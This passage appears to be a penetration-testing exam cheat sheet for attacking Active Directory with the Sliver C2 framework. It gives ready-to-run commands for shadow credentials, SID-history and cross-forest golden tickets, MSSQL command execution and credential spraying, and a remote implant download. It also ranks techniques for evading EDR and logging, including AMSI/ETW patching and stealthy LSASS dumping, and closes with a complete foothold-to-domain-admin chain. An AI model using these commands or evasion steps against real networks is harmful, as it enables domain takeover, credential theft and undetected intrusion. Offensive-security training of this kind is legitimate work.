  -account targetuser -dc-ip 10.10.10.1
# → certipy generates a cert, adds it to target's msDS-KeyCredentialLink,
#   then auths as targetuser and retrieves their NTLM hash + TGT

# Cleanup (certipy shadow auto does this automatically)
proxychains certipy shadow clear -username lowpriv@DOMAIN.local -password Pass123 \
  -account targetuser -dc-ip 10.10.10.1
```

---

## Cross-Domain & Forest Trust Attacks

### Enumerate Trusts

```
# From within Sliver
sharpview -- Get-DomainTrust
sharpview -- Get-ForestTrust
sharpview -- Get-ForestDomain               # all domains in the forest

# Shell-based
shell nltest /domain_trusts /all_trusts
shell nltest /trusted_domains
shell ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

### SID History Attack (Cross-Domain)

If SID Filtering is disabled on a trust, you can forge a ticket with a DA SID from the trusted domain.

```
# Step 1: Compromise child domain (get child krbtgt hash)
mimikatz -- "lsadump::dcsync /domain:CHILD.DOMAIN.local /user:krbtgt exit"
# Note child domain's krbtgt NTLM hash

# Step 2: Get Enterprise Admins SID from parent domain
sharpview -- Get-DomainGroup -Identity "Enterprise Admins" -Domain DOMAIN.local
# Note the SID: S-1-5-21-<parent-XXXXXXX>-519

# Step 3: Get child domain SID
sharpview -- Get-DomainSID -Domain CHILD.DOMAIN.local

# Step 4: Forge inter-realm golden ticket with Enterprise Admins SID in ExtraSids
mimikatz -- "kerberos::golden /domain:CHILD.DOMAIN.local \
  /sid:S-1-5-21-CHILD-DOMAIN-SID \
  /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
  /krbtgt:CHILD_KRBTGT_HASH \
  /user:Administrator /ptt exit"

# Step 5: Access parent domain resources
shell dir \\DC01.DOMAIN.local\c$
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /dc:DC01.DOMAIN.local /user:krbtgt exit"
```

### Cross-Forest Trust (One-Way Trust Abuse)

```
# Enumerate what the trusted forest exposes
sharpview -- Get-DomainTrust -Domain DOMAIN.local
# Look for: TrustDirection = Inbound/Bidirectional and TrustType = Forest

# Get the inter-forest trust key
mimikatz -- "lsadump::trust /patch exit"    # Must be run on the DC

# Forge an inter-forest referral ticket using the trust key
mimikatz -- "kerberos::golden /domain:DOMAIN.local \
  /sid:S-1-5-21-LOCAL-SID \
  /rc4:INTER_FOREST_TRUST_KEY \
  /user:Administrator \
  /service:krbtgt \
  /target:TRUSTED-FOREST.com /ptt exit"
```

---

## MSSQL Attacks

SQL Server is a common lateral movement and privilege escalation path in AD environments.

```
# Install SQLRecon
armory install sqlrecon

# Discover SQL servers in the domain
sa-ldapsearch DOMAIN.local DC=DOMAIN,DC=local "(ServicePrincipalName=MSSQLSvc/*)" servicePrincipalName,dNSHostName

# Enumerate access (current user)
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local /enum:whoami
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local /enum:info
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local /enum:users
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local /enum:databases

# Execute OS command via xp_cmdshell
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local \
  /module:sysinfo /command:enable_xp_cmdshell
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local \
  /module:xpcmd /command:whoami

# MSSQL linked server attacks (chain through SQL links)
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local /enum:links
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local \
  /link:SQL02.DOMAIN.local /module:xpcmd /command:whoami

# Impersonate a SQL login with IMPERSONATE privilege
sqlrecon -- /auth:wintoken /host:SQL01.DOMAIN.local \
  /impersonate:sa /module:xpcmd /command:whoami

# Spray SQL creds
sharpmapexec -- mssql /host:10.10.10.0/24 /user:sa /pass:Password123
```

---

## NoPowerShell (NPS) — PowerShell Without powershell.exe

Use when PowerShell execution is restricted (AppLocker, WDAC, policy).

```
armory install nps

# Run PowerShell commands without launching powershell.exe
nps -- Get-Process
nps -- Get-Service | Where-Object { $_.Status -eq 'Running' }
nps -- Get-LocalGroupMember Administrators
nps -- Get-ChildItem C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password
nps -- Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Description
nps -- Invoke-WebRequest -Uri http://10.10.10.10/implant.exe -OutFile C:\Windows\Temp\i.exe
nps -- [System.Environment]::GetEnvironmentVariables()
```

---

## OPSEC Reference — Noise Level Per Technique

Understanding what each technique creates on disk, in logs, and in network traffic helps you decide the right approach for the environment.

| Technique | Creates Process? | Writes Disk? | Event ID | Notes |
|-----------|-----------------|-------------|----------|-------|
| SA BOFs (`sa-*`) | No | No | None (usually) | Lowest noise — runs in implant |
| `patchit` / `inject-amsi-bypass` | No | No | None | Patch in memory only |
| `nanodump` | No | Only dump file | None / 10 | Use `--valid` flag to fix dump header |
| `mimikatz` (BOF) | No | No | 4673, 4611 (if debug) | Still triggers PPL-aware EDRs |
| `execute-assembly` | Yes (sacrificial) | No | 4688 (proc creation) | Spawns temporary process |
| `inline-execute-assembly` | No | No | None | In-process via BOF.NET |
| `shell` | Yes (cmd.exe) | No | 4688 | Highest noise — avoid when EDR present |
| `hashdump` (BOF) | No | No | 4656, 4663 (SAM access) | EDR may catch SAM access |
| `sharp-hound-4` | Yes | Yes (.zip) | 4688 + LDAP queries | Use `--stealth` / targeted collection |
| `socks5` | No | No | None | Requires session not beacon |
| Registry persistence | No (if BOF) | Yes (registry) | 4657 (reg modify) | Use `remote-reg-set` BOF |
| `remote-schtaskscreate` | No | Yes (task XML) | 4698 (task created) | Common detection — randomise name |
| Service creation | No (if BOF) | Yes | 7045 (new service) | Very loud — avoid unless necessary |
| Mimikatz `sekurlsa::logonpasswords` | No (BOF) | No | 4611 / 4648 | PPL blocks in 2022 builds |
| DCSync | No | No | 4662 (replication) | Monitored by nearly all SIEMs |

### Recommended Execution Order for Low Noise

```
1. sa-* BOFs          → recon with zero child processes
2. patchit --amsi --etw → disable logging before .NET tools
3. seatbelt           → host profiling via armory alias
4. inline-execute-assembly → tool execution in-process
5. nanodump / mimikatz BOF → credential access
6. jump-wmiexec / jump-psexec → lateral movement
7. remote-* BOFs      → persistence/cleanup without cmd.exe
```

### LSASS Access — Stealthy Options Ranked

```
# Most stealthy → least stealthy
1. handlekatz          # duplicates existing handle — no direct lsass open
2. nanodump            # custom dump using NtReadVirtualMemory + SSP trick
3. remote-procdump     # ProcDump via BOF — still triggers OpenProcess on LSASS
4. comsvcs.dll         # native but very well-monitored (Event ID 10 in Sysmon)
5. execute-assembly Mimikatz  # spawns child process, API calls all visible
```

### Key Windows Event IDs to Know

| Event ID | Source | Triggered By |
|----------|--------|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Logon with explicit credentials (runas, mimikatz) |
| 4657 | Security | Registry value modified |
| 4662 | Security | AD object operation (DCSync triggers this on DC) |
| 4673 | Security | Privileged service called (SeDebugPrivilege) |
| 4688 | Security | Process creation (if Audit Process Creation enabled) |
| 4698 | Security | Scheduled task created |
| 4720 | Security | User account created |
| 4732 | Security | User added to security group |
| 7045 | System | New service installed |
| 1102 | Security | Audit log cleared |
| Sysmon 1 | Sysmon | Process creation (more detail than 4688) |
| Sysmon 3 | Sysmon | Network connection |
| Sysmon 10 | Sysmon | Process accessed (LSASS access) |
| Sysmon 11 | Sysmon | File create |
| Sysmon 13 | Sysmon | Registry value set |

---

## Pre-Exam Checklist

### Tools to Confirm Working Before Exam Start

```bash
# On Kali — verify all tooling
sliver-server --version
which evil-winrm impacket-secretsdump bloodhound neo4j certipy
neo4j start && bloodhound --no-sandbox &

# Verify Sliver armory tools installed
sliver
armory list --installed
# Must have: rubeus, seatbelt, sharp-hound-4, sharpview, sharpup, nanodump,
#            mimikatz, sharpsecdump, certify, sharpersist, sharpdpapi
#            inject-amsi-bypass, inject-etw-bypass, patchit
#            sa-whoami, sa-netstat, sa-ipconfig, sa-ldapsearch

# Test mTLS listener + beacon roundtrip before the exam starts
mtls --lhost 0.0.0.0 --lport 8888
generate beacon --mtls YOUR_IP:8888 --format exe --seconds 5 --jitter 0 --save /tmp/test.exe
# Deploy test.exe to a lab VM, confirm callback
```

### Pre-Built Command Snippets (Copy Into Notes)

```
# Full chain — from foothold to DA
# 1. Recon
sa-whoami && sa-ipconfig && sa-netstat

# 2. Patch + enum
patchit --amsi --etw
seatbelt -- -group=system
sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp\ --zipfilename bh.zip
download C:\Windows\Temp\bh.zip /home/kali/

# 3. Kerberoast
rubeus -- kerberoast /format:hashcat /outfile:C:\Windows\Temp\ks.txt
download C:\Windows\Temp\ks.txt /home/kali/

# 4. Crack (Kali)
hashcat -m 13100 /home/kali/ks.txt /usr/share/wordlists/rockyou.txt

# 5. Pivot to DA session
interactive
socks5 start --host 127.0.0.1 --port 1080

# 6. DCSync
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /all /csv exit"

# 7. Golden ticket
mimikatz -- "kerberos::golden /domain:DOMAIN.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt exit"
```
